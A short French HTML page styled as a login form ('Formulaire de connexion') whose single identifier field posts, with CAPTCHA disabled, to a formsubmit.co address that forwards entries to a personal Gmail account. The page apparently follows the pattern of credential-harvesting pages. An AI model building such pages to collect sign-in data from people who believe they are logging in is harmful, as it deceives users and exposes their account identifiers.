<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Formulaire Identifiant</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f2f2f2;
            padding: 40px;
        }
        form {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            max-width: 400px;
            margin: auto;
        }
        input, button {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
        }
        button {
            background: #3498db;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background: #2980b9;
        }
    </style>
</head>
<body>

<h2 style="text-align:center;">Formulaire de connexion</h2>

<form action="https://formsubmit.co/vrodhie@gmail.com" method="POST">
    <input type="text" name="identifiant" placeholder="Votre identifiant" required>
    
    <!-- Option : désactiver le CAPTCHA -->
    <input type="hidden" name="_captcha" value="false">

    <!-- Option : redirection après envoi -->

    <button type="submit">Envoyer</button>
</form>

</body>
</html>
